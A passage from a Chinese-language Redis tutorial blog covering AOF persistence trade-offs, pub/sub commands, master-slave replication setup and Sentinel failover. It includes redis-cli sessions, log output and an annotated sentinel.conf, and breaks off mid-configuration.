<li><p>如果Enable AOF ，好处是在最恶劣情况下也只会丢失不超过两秒数据，启动脚本较简单只load自己的AOF文件就可以了，</p>
<p>代价一是带来了持续的IO，</p>
<p>二是AOF rewrite 的最后将 rewrite 过程中产生的新数据写到新文件造成的阻塞几乎是不可避免的。</p>
<p>只要硬盘许可，应该尽量减少AOF rewrite的频率，AOF重写的基础大小默认值64M太小了，可以设到5G以上，默认超过原大小100%大小重写可以改到适当的数值</p>
</li>
<li><p>如果不Enable AOF ，仅靠 Master-Slave Repllcation 实现高可用性也可以，能省掉一大笔IO，也减少了rewrite时带来的系统波动。代价是如果Master&#x2F;Slave 同时倒掉，会丢失十几分钟的数据，启动脚本也要比较两个 Master&#x2F;Slave 中的 RDB文件，载入较新的那个，微博就是这种架构</p>
</li>
</ul>
</li>
</ol>
<h1 id="十、redis发布订阅"><a href="#十、redis发布订阅" class="headerlink" title="十、redis发布订阅"></a>十、redis发布订阅</h1><p>Redis 发布订阅(pub&#x2F;sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。</p>
<p>Redis 客户端可以订阅任意数量的频道。</p>
<p>订阅&#x2F;发布消息图：</p>
<p>第一个：消息发送者， 第二个：频道 第三个：消息订阅者！十、redis发布订阅</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20240921150900397.png" alt="image-20240921150900397"></p>
<p>下图展示了频道 channel1 ， 以及订阅这个频道的三个客户端 —— client2 、 client5 和 client1 之间的关系：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/f74234fe4dcb0c60799446592142efcd--8ba8--image-20240921150942348.png" alt="image-20240921150942348"></p>
<p>当有新消息通过 PUBLISH 命令发送给频道 channel1 时， 这个消息就会被发送给订阅它的三个客户端： </p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/3aa664ca7d1444ad30c91597cfe42655--de96--image-20240921150954137.png" alt="image-20240921150954137"></p>
<blockquote>
<p>命令</p>
</blockquote>
<p>这些命令被广泛用于构建即时通信应用，比如网络聊天室(chatroom)和实时广播、实时提醒等</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/d258d7893e58711b6100ebd7fb948241--b706--image-20240921151004132.png" alt="image-20240921151004132"></p>
<blockquote>
<p>测试</p>
</blockquote>
<ol>
<li><p>订阅频道</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>(subscribed mode)&gt; subscribe zyy</span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;subscribe&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="number">3</span>) (integer) <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>发布消息到频道（新开一个服务验证）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; PUBLISH zyy <span class="title function_">hellp</span></span><br><span class="line"><span class="params">(integer)</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看订阅者的变化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>(subscribed mode)&gt; subscribe zyy</span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;subscribe&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="number">3</span>) (integer) <span class="number">1</span></span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;message&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="number">3</span>) <span class="string">&quot;hellp&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>原理</p>
</blockquote>
<p>Redis是使用C实现的，通过分析 Redis 源码里的 pubsub.c 文件，了解发布和订阅机制的底层实现，籍此加深对 Redis 的理解。</p>
<p>Redis 通过 PUBLISH 、SUBSCRIBE 和 PSUBSCRIBE 等命令实现发布和订阅功能。</p>
<p>通过 SUBSCRIBE 命令订阅某频道后，redis-server 里维护了一个字典，字典的键就是一个个 频道！，而字典的值则是一个链表，链表中保存了所有订阅这个 channel 的客户端。SUBSCRIBE 命令的关键，就是将客户端添加到给定 channel 的订阅链表中。</p>
<p>通过 PUBLISH 命令向订阅者发送消息，redis-server 会使用给定的频道作为键，在它所维护的 channel字典中查找记录了订阅这个频道的所有客户端的链表，遍历这个链表，将消息发布给所有订阅者。</p>
<p>Pub&#x2F;Sub 从字面上理解就是发布（Publish）与订阅（Subscribe），在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这一功能最明显的用法就是用作实时消息系统，比如普通的即时聊天，群聊等功能。</p>
<blockquote>
<p>使用场景</p>
</blockquote>
<ol>
<li>实时消息系统</li>
<li>实时聊天！（频道当做聊天室，将信息回显给所有人即可！）</li>
<li>订阅，关注系统都是可以的！</li>
</ol>
<p>稍微复杂的场景我们就会使用 消息中间件 MQ </p>
<h1 id="十一、redis主从复制"><a href="#十一、redis主从复制" class="headerlink" title="十一、redis主从复制"></a>十一、redis主从复制</h1><h2 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h2><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master&#x2F;leader)，后者称为从节点(slave&#x2F;follower)；<strong>数据的复制是单向的，只能由主节点到从节点。</strong>Master以写为主，Slave 以读为主。</p>
<p><strong>默认情况下，每台redis服务器都是主节点；</strong>且一个主节点可以有多个从节点（或者没有从节点），但一个从节点只能有一个主节点。</p>
<p><strong>主从复制的作用主要包括：</strong></p>
<ol>
<li>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式</li>
<li>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余</li>
<li>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量</li>
<li>高可用（集群）基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础</li>
</ol>
<p>一般来说，要将redis运用于工程项目中，只使用一台redis是万万不能的（宕机），原因如下：</p>
<ol>
<li>从结构上，单个Redis服务器会发生单点故障，并且一台服务器需要处理所有的请求负载，压力较大</li>
<li>从容量上，单个Redis服务器内存容量有限，就算一台Redis服务器内存容量为256G，也不能将所有内存用作Redis存储内存，一般来说，<strong>单台Redis最大使用内存不应该超过20G</strong></li>
</ol>
<p>电商网站上的商品，一般都是一次上传，无数次浏览的，说专业点也就是”多读少写”。</p>
<p>对于这种场景，我们可以使如下这种架构</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/84251e5da3e19e489866f69944d5e388--57f7--image-20240921160224020.png" alt="image-20240921160224020"></p>
<p>主从复制，读写分离！ 80% 的情况下都是在进行读操作！减缓服务器的压力！架构中经常使用！ 一主二从！</p>
<p>只要在公司中，主从复制就是必须要使用的，因为在真实的项目中不可能单机使用Redis！ </p>
<h2 id="2、环境模拟配置"><a href="#2、环境模拟配置" class="headerlink" title="2、环境模拟配置"></a>2、环境模拟配置</h2><p>复制三个配置文件，修改对应的信息</p>
<ol>
<li><p>文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-6380.conf</span><br><span class="line">redis-6381.conf</span><br><span class="line">redis-6382.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">port 6380</span><br><span class="line">port 6381</span><br><span class="line">port 6382</span><br></pre></td></tr></table></figure>
</li>
<li><p>pid名字</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pidfile /var/run/redis_6380.pid</span><br><span class="line">pidfile /var/run/redis_6381.pid</span><br><span class="line">pidfile /var/run/redis_6382.pid</span><br></pre></td></tr></table></figure>
</li>
<li><p>log文件名字</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">logfile <span class="string">&quot;6380.log&quot;</span></span><br><span class="line">logfile <span class="string">&quot;6381.log&quot;</span></span><br><span class="line">logfile <span class="string">&quot;6382.log&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>dump.rdb名字</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dbfilename dump80.rdb </span><br><span class="line">dbfilename dump81.rdb </span><br><span class="line">dbfilename dump82.rdb</span><br></pre></td></tr></table></figure></li>
</ol>
<p>启动上面三台服务</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/88e39336389ca79fb6b3e81850eb95cb--dedf--image-20240921161940317.png" alt="image-20240921161940317"></p>
<p>查看6380的库的信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6380</span>&gt; info replication</span><br><span class="line"># Replication</span><br><span class="line">role:master</span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:2f1e61ead6a91614ced7226237145ac0dbc7a617</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">0</span></span><br><span class="line">second_repl_offset:-<span class="number">1</span></span><br><span class="line">repl_backlog_active:<span class="number">0</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">0</span></span><br><span class="line">repl_backlog_histlen:<span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="3、一主二从"><a href="#3、一主二从" class="headerlink" title="3、一主二从"></a>3、一主二从</h2><p>默认情况下，每台Redis服务器都是主节点； 我们一般情况下只用配置从机就好了！</p>
<p>认老大！ 一主 （6380）二从（6381，6382）</p>
<p>配置6380作为6381的主机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6381</span>&gt; SLAVEOF <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">6380</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6381</span>&gt; info replication</span><br><span class="line"># Replication</span><br><span class="line">role:slave</span><br><span class="line">master_host:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">master_port:<span class="number">6380</span></span><br><span class="line">master_link_status:up</span><br><span class="line">master_last_io_seconds_ago:<span class="number">6</span></span><br><span class="line">master_sync_in_progress:<span class="number">0</span></span><br><span class="line">slave_read_repl_offset:<span class="number">14</span></span><br><span class="line">slave_repl_offset:<span class="number">14</span></span><br><span class="line">slave_priority:<span class="number">100</span></span><br><span class="line">slave_read_only:<span class="number">1</span></span><br><span class="line">replica_announced:<span class="number">1</span></span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:8196217be6f411e9a1b76aa7820448ad9a8b6068</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">14</span></span><br><span class="line">second_repl_offset:-<span class="number">1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">15</span></span><br><span class="line">repl_backlog_histlen:<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>重新查看6380的配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6380&gt; info replication</span><br><span class="line"><span class="comment"># Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:1</span><br><span class="line">slave0:ip=127.0.0.1,port=6381,state=online,offset=126,lag=0</span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:8196217be6f411e9a1b76aa7820448ad9a8b6068</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:126</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:1</span><br><span class="line">repl_backlog_histlen:126</span><br></pre></td></tr></table></figure>

<p>同样的配置配置6382即可</p>
<p><strong>真实的从主配置应该在配置文件中配置，这样的话是永久的，我们这里使用的是命令，暂时的！</strong></p>
<blockquote>
<p>细节</p>
</blockquote>
<p>主机可以读，可以写，从机只能读，不能写！主机中的所有信息和数据，都会被从机保存</p>
<p>主机：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6380</span>&gt; set k1 v1</span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6380</span>&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br></pre></td></tr></table></figure>

<p>从机：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6381</span>&gt; set k2 <span class="title function_">v2</span></span><br><span class="line"><span class="params">(error)</span> READONLY You can<span class="string">&#x27;t write against a read only replica.</span></span><br><span class="line"><span class="string">127.0.0.1:6381&gt; get k1</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br></pre></td></tr></table></figure>

<p>测试：主机断开连接，从机依旧连接到主机的，但是没有写操作，这个时候，主机如果回来了，从机依旧可以直接获取到主机写的信息！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主机宕机了</span></span><br><span class="line">127.0.0.1:6380&gt; shutdown</span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 从机依旧可读</span></span><br><span class="line">127.0.0.1:6381&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line"><span class="comment"># 主机回来了 并且做了写操作</span></span><br><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># redis-server myconfig/redis-6380.conf</span></span><br><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># redis-cli -p 6380</span></span><br><span class="line">127.0.0.1:6380&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">OK</span><br><span class="line"><span class="comment"># 从机还是可读</span></span><br><span class="line">127.0.0.1:6381&gt; get k2</span><br><span class="line"><span class="string">&quot;v2&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果是使用命令行，来配置的主从，这个时候如果重启了，就会变回主机！只要变为从机，立马就会从主机中获取值！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6380&gt; shutdown <span class="comment"># 从机宕机了</span></span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># redis-server myconfig/redis80.conf  # 重新启动服务</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># redis-cli -p 6380</span></span><br><span class="line">127.0.0.1:6380&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">127.0.0.1:6380&gt; info replication <span class="comment"># 发现变回主机了</span></span><br><span class="line"><span class="comment"># Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:99c0d5a904392e0a4509b01cc77e1c9cc5e85495</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:0</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:0</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:0</span><br><span class="line">repl_backlog_histlen:0</span><br><span class="line">127.0.0.1:6380&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个时候原先主机做写操作</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里也是拿不到的 因为大家都是主机，没有同步</span></span><br><span class="line">127.0.0.1:6380&gt; get k3</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6380&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 6380再次变成6379的从机，就可以获取了</span></span><br><span class="line">127.0.0.1:6380&gt; slaveof 127.0.0.1 6379</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6380&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k3&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">3) <span class="string">&quot;k2&quot;</span></span><br><span class="line">127.0.0.1:6380&gt; get k3</span><br><span class="line"><span class="string">&quot;v3&quot;</span></span><br><span class="line">127.0.0.1:6380&gt; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>复制原理</p>
</blockquote>
<p>Slave 启动成功连接到 master 后会发送一个sync同步命令</p>
<p>Master 接到命令，启动后台的存盘进程，同时收集所有接收到的用于修改数据集命令，在后台进程执行完毕之后，master将传送整个数据文件到slave，并完成一次完全同步。</p>
<p><strong>全量复制：</strong>slave服务在接收到数据库文件数据后，将其存盘并加载到内存中</p>
<p><strong>增量复制：</strong>Master 继续将新的所有收集到的修改命令依次传给slave，完成同步</p>
<p>但是只要是重新连接master，一次完全同步（全量复制）将被自动执行！ 我们的数据一定可以在从机中看到！</p>
<blockquote>
<p>层层链路</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/723bdbef4c75f6c57ea2e99d09f6095e--4ee3--image-20240921163224209.png" alt="image-20240921163224209"></p>
<p>此时6380还是从节点</p>
<blockquote>
<p>如果没有老大了，这个时候能不能选择一个老大出来呢？ 手动！</p>
</blockquote>
<p>谋朝篡位</p>
<p>如果主机断开了连接，我们可以使用 <code>slaveof no one</code> 让自己变成主机！其他的节点就可以手动连接到最新的这个主节点（手动）！如果这个时候老大修复了，那就重新连接！</p>
<h2 id="4、哨兵模式"><a href="#4、哨兵模式" class="headerlink" title="4、哨兵模式"></a>4、哨兵模式</h2><p>（自动选举老大的模式）</p>
<blockquote>
<p>概述</p>
</blockquote>
<p>主从切换技术的方法是：当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式。Redis从2.8开始正式提供了Sentinel（哨兵） 架构来解决这个问题</p>
<p>谋朝篡位的自动版，能够后台监控主机是否故障，如果故障了根据投票数<strong>自动将从库转换为主库</strong>。</p>
<p>哨兵模式是一种特殊的模式，首先Redis提供了哨兵的命令，哨兵是一个独立的进程，作为进程，它会独立运行。其原理是<strong>哨兵通过发送命令，等待Redis服务器响应，从而监控运行的多个Redis实例</strong>。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/2cf1c5d6a2a3efa128749c33e76a09b6--1c7e--image-20240921164130454.png" alt="image-20240921164130454"></p>
<p>这里的哨兵有两个作用</p>
<ul>
<li>通过发送命令，让Redis服务器返回监控其运行状态，包括主服务器和从服务器。</li>
<li>当哨兵监测到master宕机，会自动将slave切换成master，然后通过<strong>发布订阅模式</strong>通知其他的从服务器，修改配置文件，让它们切换主机。</li>
</ul>
<p>然而一个哨兵进程对Redis服务器进行监控，可能会出现问题，为此，我们可以使用多个哨兵进行监控。各个哨兵之间还会进行监控，这样就形成了多哨兵模式。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/c32fb55d8058e4eed951465390d3f5e2--ca5c--image-20240921164314334.png" alt="image-20240921164314334"></p>
<p>假设主服务器宕机，哨兵1先检测到这个结果，系统并不会马上进行failover[故障转移]过程，仅仅是哨兵1主观的认为主服务器不可用，这个现象成为<strong>主观下线</strong>。当后面的哨兵也检测到主服务器不可用，并且数量达到一定值时，那么哨兵之间就会进行一次投票，投票的结果由一个哨兵发起，进行failover操作。切换成功后，就会通过发布订阅模式，让各个哨兵把自己监控的从服务器实现切换主机，这个过程称为<strong>客观下线</strong>。</p>
<blockquote>
<p>测试</p>
</blockquote>
<p>我们目前的状态是 一主 （6379）二从（6380，6381）</p>
<p>我们目前的状态是 一主 （6379）二从（6380，6381）</p>
<ol>
<li><p>新建哨兵的配置文件sentinel.conf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sentinel monitor myredis 127.0.0.1 6380 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动哨兵</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># redis-sentinel myconfig/sentinel.conf</span></span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 <span class="comment"># WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add &#x27;vm.overcommit_memory = 1&#x27; to /etc/sysctl.conf and then reboot or run the command &#x27;sysctl vm.overcommit_memory=1&#x27; for this to take effect.</span></span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 * oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 * Redis version=7.4.0, bits=64, commit=00000000, modified=1, pid=2239978, just started</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.971 * Configuration loaded</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.972 * Increased maximum number of open files to 10032 (it was originally <span class="built_in">set</span> to 1024).</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.972 * monotonic clock: POSIX clock_gettime</span><br><span class="line">                _._                                                  </span><br><span class="line">           _.-``__ <span class="string">&#x27;&#x27;</span>-._                                             </span><br><span class="line">      _.-``    `.  `_.  <span class="string">&#x27;&#x27;</span>-._           Redis Community Edition      </span><br><span class="line">  .-`` .-```.  ```\/    _.,_ <span class="string">&#x27;&#x27;</span>-._     7.4.0 (00000000/1) 64 bit</span><br><span class="line"> (    <span class="string">&#x27;      ,       .-`  | `,    )     Running in sentinel mode</span></span><br><span class="line"><span class="string"> |`-._`-...-` __...-.``-._|&#x27;</span>` _.-<span class="string">&#x27;|     Port: 26379</span></span><br><span class="line"><span class="string"> |    `-._   `._    /     _.-&#x27;</span>    |     PID: 2239978</span><br><span class="line">  `-._    `-._  `-./  _.-<span class="string">&#x27;    _.-&#x27;</span>                                   </span><br><span class="line"> |`-._`-._    `-.__.-<span class="string">&#x27;    _.-&#x27;</span>_.-<span class="string">&#x27;|                                  </span></span><br><span class="line"><span class="string"> |    `-._`-._        _.-&#x27;</span>_.-<span class="string">&#x27;    |           https://redis.io       </span></span><br><span class="line"><span class="string">  `-._    `-._`-.__.-&#x27;</span>_.-<span class="string">&#x27;    _.-&#x27;</span>                                   </span><br><span class="line"> |`-._`-._    `-.__.-<span class="string">&#x27;    _.-&#x27;</span>_.-<span class="string">&#x27;|                                  </span></span><br><span class="line"><span class="string"> |    `-._`-._        _.-&#x27;</span>_.-<span class="string">&#x27;    |                                  </span></span><br><span class="line"><span class="string">  `-._    `-._`-.__.-&#x27;</span>_.-<span class="string">&#x27;    _.-&#x27;</span>                                   </span><br><span class="line">      `-._    `-.__.-<span class="string">&#x27;    _.-&#x27;</span>                                       </span><br><span class="line">          `-._        _.-<span class="string">&#x27;                                           </span></span><br><span class="line"><span class="string">              `-.__.-&#x27;</span>                                               </span><br><span class="line"></span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.980 * Sentinel new configuration saved on disk</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.981 * Sentinel ID is dad236bacdf1f7ef1af264a564be5fc82681fa06</span><br><span class="line">2239978:X 21 Sep 2024 16:56:34.981 <span class="comment"># +monitor master myredis 127.0.0.1 6381 quorum 1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +sdown master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +odown master myredis 127.0.0.1 6381 #quorum 1/1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +new-epoch 1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.052 <span class="comment"># +try-failover master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 * Sentinel new configuration saved on disk</span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 <span class="comment"># +vote-for-leader dad236bacdf1f7ef1af264a564be5fc82681fa06 1</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 <span class="comment"># +elected-leader master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.061 <span class="comment"># +failover-state-select-slave master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.133 <span class="comment"># -failover-abort-no-good-slave master myredis 127.0.0.1 6381</span></span><br><span class="line">2239978:X 21 Sep 2024 16:57:25.223 * Next failover delay: I will not start a failover before Sat Sep 21 17:03:26 2024</span><br></pre></td></tr></table></figure>
</li>
<li><p>这个时候master宕机了话，这个时候就会从从机中随机选择一个服务器！ （这里面有一个投票算法！）</p>
<p>也就是之前配置文件中的所写将会变成master</p>
<p>并且如果主机此时回来了，只能归并到新的主机下，当做从机，这就是哨兵模式的规则</p>
</li>
</ol>
<blockquote>
<p>哨兵模式</p>
</blockquote>
<p>优点：</p>
<ol>
<li>哨兵集群，基于主从复制模式，所有的主从配置优点，它全有</li>
<li>主从可以切换，故障可以转移，系统的可用性就会更好</li>
<li>哨兵模式就是主从模式的升级，手动到自动，更加健壮！</li>
</ol>
<p>缺点：</p>
<ol>
<li>Redis 不好在线扩容的，集群容量一旦到达上限，在线扩容就十分麻烦</li>
<li>实现哨兵模式的配置其实是很麻烦的，里面有很多选择</li>
</ol>
<p>哨兵模式的全部配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Example sentinel.conf</span></span><br><span class="line"><span class="comment"># 哨兵sentinel实例运行的端口 默认26379</span></span><br><span class="line">port 26379</span><br><span class="line"><span class="comment"># 哨兵sentinel的工作目录</span></span><br><span class="line"><span class="built_in">dir</span> /tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 哨兵sentinel监控的redis主节点的 ip port</span></span><br><span class="line"><span class="comment"># master-name 可以自己命名的主节点名字 只能由字母A-z、数字0-9 、这三个字符&quot;.-_&quot;组成</span></span><br><span class="line"><span class="comment"># quorum 配置多少个sentinel哨兵统一认为master主节点失联 那么这时客观上认为主节点失联了</span></span><br><span class="line"><span class="comment"># sentinel monitor &lt;master-name&gt; &lt;ip&gt; &lt;redis-port&gt; &lt;quorum&gt;</span></span><br><span class="line">sentinel monitor mymaster 127.0.0.1 6379 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当在Redis实例中开启了requirepass foobared 授权密码 这样所有连接Redis实例的客户端都要提供密码</span></span><br><span class="line"><span class="comment"># 设置哨兵sentinel 连接主从的密码 注意必须为主从设置一样的验证密码</span></span><br><span class="line"><span class="comment"># sentinel auth-pass &lt;master-name&gt; &lt;password&gt;</span></span><br><span class="line">sentinel auth-pass mymaster MySUPER--secret-0123passw0rd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定多少毫秒之后 主节点没有应答哨兵sentinel 此时 哨兵主观上认为主节点下线 默认30秒</span></span><br><span class="line"><span class="comment"># sentinel down-after-milliseconds &lt;master-name&gt; &lt;milliseconds&gt;</span></span><br><span class="line">sentinel down-after-milliseconds mymaster 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个配置项指定了在发生failover主备切换时最多可以有多少个slave同时对新的master进行 同步</span></span><br><span class="line"><span class="comment"># 这个数字越小，完成failover所需的时间就越长，</span></span><br><span class="line"><span class="comment"># 但是如果这个数字越大，就意味着越 多的slave因为replication而不可用。</span></span><br><span class="line"><span class="comment"># 可以通过将这个值设为 1 来保证每次只有一个slave 处于不能处理命令请求的状态。</span></span><br><span class="line"><span class="comment"># sentinel parallel-syncs &lt;master-name&gt; &lt;numslaves&gt;</span></span><br><span class="line">sentinel parallel-syncs mymaster 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故障转移的超时时间 failover-timeout 可以用在以下这些方面：</span></span><br><span class="line"><span class="comment">#1. 同一个sentinel对同一个master两次failover之间的间隔时间。</span></span><br><span class="line"><span class="comment">#2. 当一个slave从一个错误的master那里同步数据开始计算时间。直到slave被纠正为向正确的master那 里同步数据时。</span></span><br><span class="line"><span class="comment">#3.当想要取消一个正在进行的failover所需要的时间。</span></span><br><span class="line"><span class="comment">#4.当进行failover时，配置所有slaves指向新的master所需的最大时间。不过，即使过了这个超时， slaves依然会被正确配置为指向master，但是就不按parallel-syncs所配置的规则来了</span></span><br><span class="line"><span class="comment"># 默认三分钟</span></span><br><span class="line"><span class="comment"># sentinel failover-timeout &lt;master-name&gt; 